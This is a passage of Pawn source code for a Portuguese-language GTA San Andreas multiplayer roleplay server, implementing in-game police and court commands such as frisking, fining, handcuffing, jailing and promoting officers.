				dis = GetDistance(PX, PY, PZ, X, Y, Z);
				fdis = GetDistance(PX, PY, PZ, X + 0.1 * floatsin(-A, degrees), Y + 0.1 * floatcos(-A, degrees), Z);
				ang = mod(PA - A);

				if(dis < D && dis >= fdis && (ang < 210.0 || ang > 150.0))
				{
				    D = dis;
				    plid = n;
				}
	        }
	    }

		if(plid == INVALID_PLAYER_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar na frente de alguém para revistá-lo.");
		    return 1;
		}
		
	    xpath = GetPlayerXFilePath(plid);
	    format(string, sizeof string, "%s - Conteúdo:", PlayerName(plid));
	    SendClientMessage(playerid, COLOUR_SWAT, string);
	    format(string, sizeof string, "Arma pesada: %s/%d - Arma leve: %s/%d - Arma branca: %s", Weapons[pWeapons[plid][0]][wName], pWeapons[plid][1], Weapons[pWeapons[plid][2]][wName], pWeapons[plid][3], Weapons[pWeapons[plid][4]][wName]);
		SendClientMessage(playerid, COLOUR_WHITE, string);
		format(string, sizeof string, "Cigarro: %dmg", Cigar[plid]);
		SendClientMessage(playerid, COLOUR_WHITE, string);
		format(string, sizeof string, "O Oficial %s lhe revistou.", PlayerName(playerid));
		SendClientMessage(plid, COLOUR_WHITE, string);
		return 1;
	}
	
	if(strcmp(cmd, "/examinararea", true) == 0)
	{
		new tmp[128], string[128];
		new plid;
		new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ, Float:OFF;

        if(CheckArea[playerid] != INVALID_PLAYER_ID)
		{
			plid = CheckArea[playerid];
			CheckArea[playerid] = CheckArea[plid] = INVALID_PLAYER_ID;
			PlayerEvent[playerid] &= ~PLAYER_EVENT_CHECKAREA;
			PlayerEvent[plid] &= ~PLAYER_EVENT_CHECKAREA;
			RemovePlayerWantedPlayers(playerid);
			RemovePlayerWantedPlayers(plid);
		    SendClientMessage(playerid, COLOUR_SWAT, "Exame de área cancelado.");
		    SendClientMessage(plid, COLOUR_SWAT, "Exame de área cancelado.");
		    return 1;
		}
		
		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /examinararea [id]");
	        return 1;
		}

		plid = strval(tmp);

		if(!IsPlayerConnected(plid))
		{
			SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			return 1;
		}

		if(plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você só pode examinar a área com outro jogador.");
		    return 1;
		}
		
		if(!IsPlayerInAnyVehicle(playerid))
			GetPlayerPos(playerid, X, Y, Z);
			
		else
		    GetVehiclePos(GetPlayerVehicleID(playerid), X, Y, Z);
		    
		if(!IsPlayerInAnyVehicle(plid))
			GetPlayerPos(plid, PX, PY, PZ);

		else
		    GetVehiclePos(GetPlayerVehicleID(plid), PX, PY, PZ);
		    
		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar mais próximo do jogador.");
			return 1;
		}
		
		if(!IsPlayerCop(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você só pode examinar a área com outro policial.");
			return 1;
		}
		
		if(X < PX)
		{
		    OFF = X;
			X = PX;
			PX = OFF;
		}
		
		if(Y < PY)
		{
		    OFF = Y;
		    Y = PY;
		    PY = OFF;
		}
		
		CheckArea[playerid] = plid;
		CheckArea[plid] = playerid;
		PlayerEvent[playerid] |= PLAYER_EVENT_CHECKAREA;
		CheckAreaGangZone[playerid] = CheckAreaGangZone[plid] = GangZoneCreate(X, Y, PX, PY);
		GangZoneShowForPlayer(playerid, CheckAreaGangZone[playerid], COLOUR_SWAT);
		GangZoneShowForPlayer(plid, CheckAreaGangZone[plid], COLOUR_SWAT);
		SendClientMessage(playerid, COLOUR_SWAT, "Exame de área iniciado.");
		format(string, sizeof string, "%s começou a examinar a área com você.", PlayerName(playerid));
		SendClientMessage(plid, COLOUR_SWAT, string);
		return 1;
	}
	
	if(strcmp(cmd, "/apreenderveiculo", true) == 0)
	{
	    new vpath[128];
	    new vehid;
	    new Float:X, Float:Y, Float:Z, Float:A;
	    
		if(!IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está em um veículo.");
	        return 1;
		}
		
	    vehid = GetPlayerVehicleID(playerid);
	    
	    if(!IsPlayerVehicle(vehid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não pode apreender este veículo.");
	        return 1;
	    }
	    
	    vpath = GetVehicleFilePath(vehid);
	    
	    if(hGetInt(vpath, "Fine") <= 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Este veículo não possui dívidas.");
	        return 1;
	    }
	    
	    if(hGetInt(vpath, "Seized"))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Este veículo já está apreendido.");
	        return 1;
	    }
	    
	    GetVehiclePos(vehid, X, Y, Z);
	    GetVehicleZAngle(vehid, A);
	    
	    if(X < 1537.9198 || X > 1611.7349 || Y < -1721.5104 || Y > -1602.9403)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Delegacia.");
	        return 1;
	    }
	    
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(!IsPlayerAdmin(n))
	        	SetVehicleParamsForPlayer(vehid, n, 0, 1);
		}

        hSetInt(vpath, "Seized", 1);
        Pay(playerid, 500);
		SaveVehiclePos(vehid, X, Y, Z, A);
        RemovePlayerFromVehicle(playerid);
        DrawTextForPlayer(playerid, "Veículo apreendido.~n~$500,00 dólares", COLOUR_GREEN, TEXTDRAW_STYLE_2, 3000);
	    return 1;
	}
	
	if(strcmp(cmd, "/multar", true) == 0)
	{
		new tmp[128], xvpath[128], string[128];
		new option, plid, value;
		
		option = 0;
		tmp = strtok(cmdtext, idx);
		
		if(strlen(tmp) > 0)
		{
		    if(strcmp(tmp, "pessoa", true) == 0)
		        option = 1;
		        
			if(strcmp(tmp, "veiculo", true) == 0)
			    option = 2;
		}
		
		if(option == 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /multar [pessoa/veiculo] [id] [quantidade]");
		    return 1;
		}
		
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /multar [pessoa/veiculo] [id] [quantidade]");
		    return 1;
		}
		
		plid = strval(tmp);

        if(!IsPlayerConnected(plid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	        return 1;
	    }
	    
		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /multar [pessoa/veiculo] [id] [quantidade]");
		    return 1;
		}

		value = strval(tmp);
		
		if(value < 1 || value > 500)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Valor entre $1,00 e $500,00 dólares.");
		    return 1;
		}
		
		if(option == 1)
		{
		    xvpath = GetPlayerXFilePath(plid);
		    SendClientMessage(playerid, COLOUR_SWAT, "Jogador multado.");
		    format(string, sizeof string, "O Oficial %s lhe multou em $%d,00 dólares.", PlayerName(playerid), value);
		    SendClientMessage(plid, COLOUR_WHITE, string);
		    format(string, sizeof string, "O Oficial %s multou %s em $%d,00 dólares.", PlayerName(playerid), PlayerName(plid), value);
			SendClientMessageToPolice(COLOUR_SWAT, string);
		}
		
		if(option == 2)
		{
		    new vehid;
		    
		    if(!IsPlayerInAnyVehicle(playerid))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não está em um veículo.");
		    	return 1;
		    }
		    
		    vehid = GetPlayerVehicleID(plid);
		    
			if(!IsPlayerVehicle(vehid))
			{
			    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não está em um veículo.");
		    	return 1;
			}
	
			xvpath = GetVehicleFilePath(vehid);
			SendClientMessage(playerid, COLOUR_SWAT, "Veículo multado.");
			format(string, sizeof string, "O Oficial %s multou seu veículo em $%d,00 dólares.", PlayerName(playerid), value);
			SendClientMessage(plid, COLOUR_WHITE, string);
			format(string, sizeof string, "O Oficial %s multou o veiculo de %s em $%d,00 dólares.", PlayerName(playerid), PlayerName(plid), value);
			SendClientMessageToPolice(COLOUR_SWAT, string);
		}
		
		Pay(playerid, 100);
		hSetInt(xvpath, "Fine", hGetInt(xvpath, "Fine") + value);
		return 1;
	}
	
	if(strcmp(cmd, "/vdocs", true) == 0)
	{
	    new plate[128];
		new vehid;
		
	    plate = strtok(cmdtext, idx);

	    if(!strlen(plate))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /vdocs [placa]");
	        return 1;
	    }

	    if(GetPlayerInt(playerid) != INT_POLICE_DEPARTMENT && !IsPlayerInJobVehicle(playerid, POLICE_CAR))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Delegacia nem em uma viatura.");
	        return 1;
		}

		vehid = GetPlateVehicleId(plate);
		
		if(vehid == INVALID_VEHICLE_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Veículo não encontrado.");
	        return 1;
		}
		
		ShowVehicleDocumentsForPlayer(vehid, playerid, INVALID_PLAYER_ID);
		return 1;
	}
	
	if(strcmp(cmd, "/ficha", true) == 0)
	{
	    new xpath[128], name[128], string[128];
	    new busted, wanted;
	    
	    name = strtok(cmdtext, idx);
	    
	    if(!strlen(name))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /ficha [nome]");
	        return 1;
	    }
	    
	    if(GetPlayerInt(playerid) != INT_POLICE_DEPARTMENT && GetPlayerInt(playerid) != INT_TRIBUNAL && !IsPlayerInJobVehicle(playerid, POLICE_CAR))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não está na Delegacia, no Tribunal nem em uma viatura.");
	        return 1;
		}
		
	    xpath = GetPlayerNameXFilePath(name);
	    
	    if(!fexist(xpath))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Dados do jogador não encontrados.");
	        return 1;
	    }
	    
	    busted = hGetInt(xpath, "BustedTime");
	    wanted = hGetInt(xpath, "WantedLevel");
	    
	    format(string, sizeof string, "[------ %s - Ficha Criminal ------]", name);
	    SendClientMessage(playerid, COLOUR_SWAT, string);

		if(busted <= 0)
			string = ("Não");
			
		else
		    format(string, sizeof string, "Sim (%dh restantes)", busted);
		    
		format(string, sizeof string, "Preso: %s", string);
		SendClientMessage(playerid, COLOUR_WHITE, string);
		
		if(wanted == 0)
		    string = ("Não");
		    
		else
		    format(string, sizeof string, "Sim - Estrelas: %d", wanted);
		    
        format(string, sizeof string, "Procurado: %s", string);
		SendClientMessage(playerid, COLOUR_WHITE, string);
	    return 1;
	}
	
	if(strcmp(cmd, "/procurar", true) == 0)
	{
	    new tmp[128], xpath[128], string[128];
	    new plid, wanted;

	    tmp = strtok(cmdtext, idx);

	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /procurar [id]");
	        return 1;
	    }

	    plid = strval(tmp);
	    
	    if(!IsPlayerConnected(plid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	        return 1;
	    }
	    
	    xpath = GetPlayerXFilePath(plid);
	    wanted = hGetInt(xpath, "WantedLevel");
	    
	    if(wanted < 0)
	        wanted = 0;
	        
		if(wanted > 6)
		    wanted = 6;
		    
		if(wanted == 6)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador já é procurado nível máximo.");
	        return 1;
		}
		
		if(GetPlayerCounter(plid, COUNTER_WANTED) > 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve esperar para aumentar o nível de procurado deste jogador.");
	        return 1;
		}
		
		wanted++;
		hSetInt(xpath, "WantedLevel", wanted);
		SetPlayerCounter(plid, COUNTER_WANTED, 7);
		SetPlayerWantedLevel(plid, wanted);
		format(string, sizeof string, "Suspeito procurado, vivo ou morto [Nome: %s, Estrelas: %d], Oficial %s", PlayerName(plid), wanted, PlayerName(playerid));
		SendClientMessageToPolice(COLOUR_SWAT, string);
		SendClientMessage(plid, COLOUR_WHITE, "Você foi adicionado a lista de procurados.");
		return 1;
	}
	
	if(strcmp(cmd, "/desprocurar", true) == 0)
	{
	    new tmp[128], xpath[128], string[128];
	    new plid;

	    tmp = strtok(cmdtext, idx);

	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /desprocurar [id]");
	        return 1;
	    }

	    plid = strval(tmp);

	    if(!IsPlayerConnected(plid))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
	        return 1;
	    }

	    xpath = GetPlayerXFilePath(plid);
	    
	    if(hGetInt(xpath, "WantedLevel") == 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não está procurado no momento.");
	        return 1;
	    }
	    
	    hSetInt(xpath, "WantedLevel", 0);
	    SetPlayerCounter(plid, COUNTER_HOTEL, 0);
		format(string, sizeof string, "Suspeito %s removido da lista de procurados pelo Oficial %s.", PlayerName(plid), PlayerName(playerid));
		SendClientMessageToPolice(COLOUR_SWAT, string);
		SendClientMessage(plid, COLOUR_WHITE, "Você foi removido da lista de procurados.");
		return 1;
	}
	
	if(strcmp(cmd, "/algemar", true) == 0)
	{
	    new plid;
	    new Float:PX, Float:PY, Float:PZ, Float:PA, Float:X, Float:Y, Float:Z, Float:A, Float:D;
	    
	    if(PlayerEvent[playerid] & PLAYER_EVENT_HOLDING)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você já está algemando um jogador.");
	        return 1;
	    }
	    
	    if(Dying[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está morrendo, não pode algemar um jogador.");
	        return 1;
	    }
	    
	    if(Limp[playerid] != 0)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você está mancando, não pode algemar um jogador.");
	        return 1;
	    }
	    
	    GetPlayerPos(playerid, PX, PY, PZ);
	    GetPlayerFacingAngle(playerid, PA);
	    D = NAME_TAG_DRAW_DISTANCE;
	    plid = INVALID_PLAYER_ID;
	    
	    for(new n = 0; n < MAX_SLOTS; n++)
	    {
	        if(IsPlayerConnected(n) && IsPlayerLogged(n) && Dying[n] == 0 && n != playerid)
	        {
				new Float:dis, Float:bdis, Float:ang;

                for(new cop = 0; cop < MAX_SLOTS; cop++)
				{
	    			if(IsPlayerConnected(cop) && IsPlayerLogged(cop) && HoldId[cop] == n)
	        			continue;
				}
	
				GetPlayerPos(n, X, Y, Z);
				GetPlayerFacingAngle(n, A);
				dis = GetDistance(PX, PY, PZ, X, Y, Z);
				bdis = GetDistance(PX, PY, PZ, X - 0.1 * floatsin(-A, degrees), Y - 0.1 * floatcos(-A, degrees), Z);
				ang = mod(PA - A);
				
				if(dis < D && dis >= bdis && (ang < 30.0 || ang > 330.0))
				{
				    D = dis;
				    plid = n;
				}
	        }
	    }
	    
		if(plid == INVALID_PLAYER_ID)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar atrás de alguém para algemá-lo.");
		    return 1;
		}
		
		HoldId[playerid] = plid;
		PlayerEvent[playerid] |= PLAYER_EVENT_HOLDING;
		Rob[plid] = 0;
	    ApplyAnimation(plid, "PED", "WALK_csaw", 4.1, 1, 1, 1, 1, -1, 1);
	    DrawTextForPlayer(plid, "Algemado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
	    SendClientMessage(playerid, COLOUR_SWAT, "Jogador algemado.");
	    return 1;
	}
	
	if(strcmp(cmd, "/desalgemar", true) == 0)
	{
	    if(PlayerEvent[playerid] & PLAYER_EVENT_HOLDING)
	    {
	        PlayerEvent[playerid] &= ~PLAYER_EVENT_HOLDING;
	        ClearAnimations(HoldId[playerid]);
	    	DrawTextForPlayer(HoldId[playerid], "Desalgemado.", COLOUR_RED, TEXTDRAW_STYLE_3, 3000);
	    	HoldId[playerid] = -1;
	    	SendClientMessage(playerid, COLOUR_SWAT, "Jogador desalgemado.");
	    	return 1;
		}
		
		SendClientMessage(playerid, COLOUR_GRAY, "Você não algemou ninguém.");
		return 1;
	}
	
	if(strcmp(cmd, "/prender", true) == 0)
	{
	    if(PlayerEvent[playerid] & PLAYER_EVENT_HOLDING)
	    {
	        new xpath[128], string[128];
	        new wanted, id, start, time, year, month, day, hour, minute, second;
	        new Float:X, Float:Y, Float:Z;
	        
	        id = HoldId[playerid];
	        
	        if(GetPlayerInterior(playerid) != 6 || GetPlayerInterior(id) != 6)
	        {
	            SendClientMessage(playerid, COLOUR_GRAY, "Você e o jogador devem estar próximos à cela.");
				return 1;
	        }
	        
	        for(new x = 0; x < 2; x++)
	        {
	            switch(x)
	            {
	                case 0:
						GetPlayerPos(playerid, X, Y, Z);
						
					case 1:
					    GetPlayerPos(id, X, Y, Z);
				}
				
				if(GetDistance(X, Y, Z, 266.7647, 77.7550, 1001.0390) > NAME_TAG_DRAW_DISTANCE)
				{
				    SendClientMessage(playerid, COLOUR_GRAY, "Você e o jogador devem estar próximos à cela.");
					return 1;
				}
	        }
	        
	        xpath = GetPlayerXFilePath(id);
	        wanted = hGetInt(xpath, "WantedLevel");
	        getdate(year, month, day);
	        gettime(hour, minute, second);
			start = ((year - MYEAR) & 0xF) | ((month & 0xF) << 4) | ((day & 0x1F) << 8) | ((hour & 0x1F) << 13) | ((minute & 0x3F) << 18);
			
	        if(wanted < 0)
			    wanted = 0;
			    
	        if(wanted > 6)
				wanted = 6;
				
			if(wanted < 5)
			    time = (wanted + 1) * 15;
			    
			else
			    time = 75 + ((wanted - 4) * 20) + ((wanted - 5) * 5);
			
            HoldId[playerid] = -1;
			Pay(playerid, (wanted * 50) + 50);
            PlayerEvent[playerid] &= ~PLAYER_EVENT_HOLDING;
	        ClearAnimations(id);
	        hSetInt(xpath, "BustedStart", start);
	    	hSetInt(xpath, "BustedTime", time);
	    	hSetInt(xpath, "WantedLevel", 0);
	        SetPlayerWantedLevel(id, 0);
	        SetSpawnInfo(id, 0, hGetInt(xpath, "Skin"), 262.8808, 76.1974, 1001.0390, float(random(360)), 0, 0, 0, 0, 0, 0);
	    	SpawnPlayer(id);
	    	SendClientMessage(playerid, COLOUR_SWAT, "Jogador capturado, você recebeu uma recompensa.");
	    	DrawTextForPlayer(id, "Preso!", COLOUR_RED, TEXTDRAW_STYLE_3, 4000);
	    	format(string, sizeof string, "Suspeito %s capturado pelo Oficial %s, operação sucedida, bom trabalho!", PlayerName(id), PlayerName(playerid));
			SendClientMessageToPolice(COLOUR_SWAT, string);
	    	return 1;
	    }
	    
	    SendClientMessage(playerid, COLOUR_GRAY, "Você não algemou ninguém.");
		return 1;
	}
	
	if(strcmp(cmd, "/soltar", true) == 0)
	{
	    new tmp[128], xpath[128], string[128];
	    new plid;
	    new Float:X, Float:Y, Float:Z;
	    
	    tmp = strtok(cmdtext, idx);
	    
	    if(!strlen(tmp))
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "USO: /soltar [id]");
	        return 1;
	    }
	    
	    plid = strval(tmp);
	    GetPlayerPos(playerid, X, Y, Z);
	    
	    if(GetDistance(X, Y, Z, 266.7647, 77.7550, 1001.0390) > NAME_TAG_DRAW_DISTANCE)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Você deve estar próximo à cela.");
			return 1;
		}
		
		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
			return 1;
		}
		
		xpath = GetPlayerXFilePath(plid);
		
		if(hGetInt(xpath, "BustedTime") <= 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não está preso.");
			return 1;
		}
		
		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-soltar.");
			return 1;
		}
		
		hSetInt(xpath, "BustedStart", 0);
		hSetInt(xpath, "BustedTime", 0);
		SetPlayerInterior(plid, 6);
  		SetPlayerPos(plid, 266.7647, 77.7550, 1001.0390);
  		SetPlayerVirtualWorld(plid, 0);
  		UpdatePlayerSpawn(plid);
  		SendClientMessage(playerid, COLOUR_SWAT, "Prisioneiro solto.");
  		format(string, sizeof string, "Você foi solto pelo Oficial/Meritissimo Sr. %s", PlayerName(playerid));
  		SendClientMessage(plid, COLOUR_WHITE, string);
  		format(string, sizeof string, "Suspeito %s solto pelo Oficial/Meritissimo Sr. %s.", PlayerName(plid), PlayerName(playerid));
		SendClientMessageToPolice(COLOUR_SWAT, string);
		SendClientMessageToJob(JOB_JUDGE, COLOUR_JUDGE, string);
  		DrawTextForPlayer(plid, "Solto.", COLOUR_RED, TEXTDRAW_STYLE_3, 4000);
		return 1;
	}
	
	if(strcmp(cmd, "/promover", true) == 0)
	{
	    new xpath[128], tmp[128];
	    new plid, job;
	    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;
	    
	    tmp = strtok(cmdtext, idx);
	    
		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /promover [id]");
		    return 1;
		}
		
		plid = strval(tmp);
		
		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    return 1;
		}
		
		if(!IsPlayerCop(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não é policial.");
		    return 1;
		}
		
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerPos(plid, PX, PY, PZ);
		
		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
		    return 1;
		}
		
		xpath = GetPlayerXFilePath(plid);
		job = hGetInt(xpath, "Job");
		
		if(job == JOB_POLICE)
		    job = JOB_SWAT;
		    
		else if(job == JOB_SWAT)
		    job = JOB_DELEGATE;
		    
		else
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não pode ser promovido.");
		    return 1;
		}
		
		if(hGetInt(xpath, "Job") < Jobs[job][jobLevel])
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não possui level para ser promovido.");
		    return 1;
		}
		
		if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-promover.");
			return 1;
		}
		
		ChangePlayerJob(plid, job);
		SendClientMessage(playerid, COLOUR_SWAT, "Jogador promovido.");
		SendClientMessage(plid, COLOUR_SWAT, "Parabéns! Você foi promovido na carreira policial...");
		SendClientMessage(plid, COLOUR_SWAT, "Não vá amolar agora hein? Continue se esforçando e mostre que é capaz!");
        DrawTextForPlayer(plid, "PROMOVIDO! =D", COLOUR_GREEN, TEXTDRAW_STYLE_2, 5000);
	    return 1;
	}
	
	if(strcmp(cmd, "/rebaixar", true) == 0)
	{
	    new xpath[128], tmp[128];
	    new plid, job;
	    new Float:X, Float:Y, Float:Z, Float:PX, Float:PY, Float:PZ;

	    tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /rebaixar [id]");
		    return 1;
		}

		plid = strval(tmp);

		if(!IsPlayerConnected(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Jogador desconectado.");
		    return 1;
		}

		if(!IsPlayerCop(plid))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não é policial.");
		    return 1;
		}

		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerPos(plid, PX, PY, PZ);

		if(GetDistance(X, Y, Z, PX, PY, PZ) > NAME_TAG_DRAW_DISTANCE)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Chegue mais perto do jogador.");
		    return 1;
		}

        xpath = GetPlayerXFilePath(plid);
		job = hGetInt(xpath, "Job");

		if(job == JOB_POLICE)
		    job = JOB_UNEMPLOYED;

		else if(job == JOB_SWAT)
		    job = JOB_POLICE;

		else if(job == JOB_DELEGATE)
		{
		    if(!IsPlayerAdmin(playerid))
		    {
		        SendClientMessage(playerid, COLOUR_GRAY, "Você não pode rebaixar um Delegado.");
		        return 1;
		    }
		    
		    job = JOB_SWAT;
		}
		
		else
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Este jogador não pode ser rebaixado.");
		    return 1;
		}

        if(!IsPlayerAdmin(playerid) && plid == playerid)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não pode se auto-rebaixar.");
			return 1;
		}
		
		ChangePlayerJob(plid, job);
		SendClientMessage(playerid, COLOUR_SWAT, "Jogador rebaixado.");
		
		if(job == JOB_UNEMPLOYED)
		{
		    SendClientMessage(plid, COLOUR_SWAT, "O sonho acabou... Você foi demitido!");
			SendClientMessage(plid, COLOUR_SWAT, "Pois é, alguns não nascem para ser policial, mas não desanime, há outros empregos por aí.");
			DrawTextForPlayer(plid, "DEMITIDO! ='(", COLOUR_RED, TEXTDRAW_STYLE_2, 5000);
		}
		
		else
		{
			SendClientMessage(plid, COLOUR_SWAT, "Eita! Você foi rebaixado na carreira policial...");
			SendClientMessage(plid, COLOUR_SWAT, "Calma, não é o fim do mundo, melhor erguer a cabeça e mostrar sua capacidade.");
			DrawTextForPlayer(plid, "REBAIXADO! =X", COLOUR_RED, TEXTDRAW_STYLE_2, 5000);
		}
		
		return 1;
	}
	
	// Policial - Fim

    // Advogado - Inicio
    
	// Advogado - Fim

	// Juiz - Inicio

    if(strcmp(cmd, "/tribunal", true) == 0)
	{
	    new tmp[128], string[128];
		new plid, playa;
	    
		if(GetPlayerInterior(playerid) != 10)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Você não está no Tribunal.");
		    return 1;
		}

		if(TribunalJudge != -1)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "Já há um julgamento ocorrendo.");
		    return 1;
		}

		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "USO: /tribunal [id 1] [id 2]");
		    return 1;
		}

		plid = strval(tmp);

		if(!IsPlayerConnected(plid) || !IsPlayerLogged(plid))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Jogador 1 não conectado/logado.");
	    	return 1;
		}
		
		if(GetPlayerInterior(plid) != 10 && hGetInt(GetPlayerXFilePath(plid), "BustedTime") > 0)
		{
		    SendClientMessage(playerid, COLOUR_GRAY, "O jogador 1 deve estar no Tribunal ou preso para participar de um julgamento.");
		    return 1;
		}
		
		tmp = strtok(cmdtext, idx);

		if(!strlen(tmp))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "USO: /tribunal [id 1] [id 2]");
	    	return 1;
		}
		
		playa = strval(tmp);

		if(!IsPlayerConnected(playa) || !IsPlayerLogged(playa))
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Jogador 2 não conectado/logado.");
	    	return 1;
		}

		if(GetPlayerInterior(playa) != 10 && hGetInt(GetPlayerXFilePath(playa), "BustedTime") > 0)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "O jogador 2 deve estar no Tribunal ou preso para participar de um julgamento.");
	    	return 1;
		}

		if(Dying[plid] != 0 || Dying[playa] != 0)
		{
  			SendClientMessage(playerid, COLOUR_GRAY, "Um desses jogadores está morrendo.");
	    	return 1;
		}

		TribunalJudge = playerid;
		Audience[0] = plid;
		Audience[1] = playa;
		Lawyers[0] = -1;
		Lawyers[1] = -1;
		SendClientMessage(playerid, COLOUR_JUDGE, "Julgamento iniciado.");
		format(string, sizeof string, "[TRIBUNAL] O Juiz %s iniciou um julgamento entre %s e %s.", PlayerName(plid), PlayerName(playa));
		SendClientMessage(playerid, COLOUR_JUDGE, string);
		SendClientMessage(playa, COLOUR_JUDGE, string);
		SendClientMessage(plid, COLOUR_JUDGE, string);
		SendClientMessageToJob(JOB_LAWYER, COLOUR_LAWYER, string);
		SendClientMessageToJob(JOB_LAWYER, COLOUR_LAWYER, "[TRIBUNAL] Se um desses participantes é seu cliente, vá defende-lo no Tribunal.");

		if(hGetInt(GetPlayerXFilePath(plid), "BustedTime") > 0)
		    SendClientMessage(plid, COLOUR_JUDGE, "[TRIBUNAL] Você foi retirado da cela para o julgamento.");

		if(hGetInt(GetPlayerXFilePath(playa), "BustedTime") > 0)
		    SendClientMessage(playa, COLOUR_JUDGE, "[TRIBUNAL] Você foi retirado da cela para o julgamento.");
		
		AddLevel(playerid);
		SendClientMessage(plid, COLOUR_JUDGE, "Digite /meuadvogado [id] para declarar alguém como seu advogado.");
		SendClientMessage(playa, COLOUR_JUDGE, "Digite /meuadvogado [id] para declarar alguém como seu advogado.");
		TogglePlayerControllable(plid, false);
		TogglePlayerControllable(playa, false);
		SetPlayerInterior(playerid, 10);
		SetPlayerPos(playerid, 246.9226, 125.3442, 1003.2188);
		SetPlayerFacingAngle(playerid, 180.2396);
		SetPlayerInterior(plid, 10);
		SetPlayerPos(plid, 249.7836, 121.6792, 1003.2188);
		SetPlayerFacingAngle(plid, 2.6013);
		SetPlayerInterior(playa, 10);
		SetPlayerPos(playa, 243.7810, 121.8285, 1003.2518);
		SetPlayerFacingAngle(playa, 0.7213);
		return 1;
	}
	
	if(strcmp(cmd, "/meuadvogado", true) == 0)
	{
	    new tmp[128], string[128];
	    new plid;
	    
	    if(TribunalJudge == -1)
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Não há nenhum julgamento ocorrendo.");
	        return 1;
	    }
	    
	    if(playerid != Audience[0] && playerid != Audience[1])
	    {
	        SendClientMessage(playerid, COLOUR_GRAY, "Você não faz parte do julgamento.");
	        return 1;
	    }
	    
		tmp = strtok(cmdtext, idx);
		
		if(!strlen(tmp))
		{
